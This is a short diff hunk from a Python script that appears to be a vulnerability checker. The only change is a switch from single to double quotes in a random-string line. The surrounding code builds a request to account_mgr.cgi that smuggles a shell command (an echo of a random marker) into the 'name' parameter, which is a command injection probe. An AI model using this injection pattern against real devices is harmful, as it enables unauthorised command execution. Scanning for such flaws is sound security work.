@@ -6,7 +6,7 @@ from urllib.parse import quote_plus
 
 
 def verify(url: str, session: requests.Session) -> bool:
-    verify_string = ''.join(random.choices(string.ascii_uppercase, k=5))
+    verify_string = "".join(random.choices(string.ascii_uppercase, k=5))
     
     cmd = quote_plus(f"echo {verify_string}")
     endpoint = f"{url}/cgi-bin/account_mgr.cgi?cmd=cgi_user_add&name=%27;{cmd};%27"
